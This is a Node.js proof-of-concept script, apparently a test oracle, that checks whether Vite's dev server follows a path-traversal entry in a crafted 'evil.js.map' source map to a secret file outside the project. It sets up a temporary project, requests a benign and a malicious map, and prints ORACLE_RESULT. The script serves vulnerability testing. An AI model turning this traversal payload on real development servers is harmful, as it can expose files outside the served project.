const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite-map-traversal-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'project');
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const safeMapName = 'safe.js.map';
    const safeMapPath = path.join(depsDir, safeMapName);
    const safeMapObj = {
      version: 3,
      file: 'safe.js',
      sources: ['safe-source.ts'],
      names: [],
      mappings: ''
    };
    fs.writeFileSync(safeMapPath, JSON.stringify(safeMapObj));

    const outsideSecret = path.join(base, 'outside-secret-' + marker + '.txt');
    fs.writeFileSync(outsideSecret, 'SECRET_' + marker);

    const relTraversal = path.relative(depsDir, outsideSecret).split(path.sep).join('/');
    const evilMapName = 'evil.js.map';
    const evilMapPath = path.join(depsDir, evilMapName);
    const evilMapObj = {
      version: 3,
      file: 'evil.js',
      sources: [relTraversal],
      names: [],
      mappings: ''
    };
    fs.writeFileSync(evilMapPath, JSON.stringify(evilMapObj));

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer unavailable');
    }

    const server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true, force: false }
    });

    const request = (url) => new Promise((resolve, reject) => {
      const req = { method: 'GET', url, headers: {} };
      const res = {
        statusCode: 200,
        headers: {},
        body: '',
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
          }
          return this;
        },
        write(chunk) { if (chunk) this.body += String(chunk); },
        end(chunk) { if (chunk) this.body += String(chunk); resolve({ statusCode: this.statusCode || 200, headers: this.headers, body: this.body }); }
      };
      try {
        server.middlewares.handle(req, res, () => {
          resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body || '' });
        });
      } catch (e) {
        reject(e);
      }
    });

    let benign;
    try {
      benign = await request('/node_modules/.vite/deps/' + safeMapName);
    } catch (e) {
      await server.close();
      throw new Error('benign request exception: ' + (e && e.message ? e.message : String(e)));
    }

    const benignBody = String((benign && benign.body) || '');
    const benignOk = benign && benign.statusCode >= 200 && benign.statusCode < 300 && benignBody.includes('safe-source.ts');
    if (!benignOk) {
      await server.close();
      throw new Error('benign optimized deps map fetch failed: status=' + (benign ? benign.statusCode : 'none'));
    }

    operation_completed = true;

    let malResp = null;
    let malErr = null;
    try {
      malResp = await request('/node_modules/.vite/deps/' + evilMapName);
    } catch (e) {
      malErr = e;
    }

    await server.close();

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious request blocked by exception: ' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const malBody = String((malResp && malResp.body) || '');
      const hasTraversal = malBody.includes(relTraversal);
      exploit_succeeded = hasTraversal;
      evidence = 'benign_status=' + benign.statusCode + ', malicious_status=' + (malResp ? malResp.statusCode : 'none') + ', traversal_reflected=' + hasTraversal;
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();
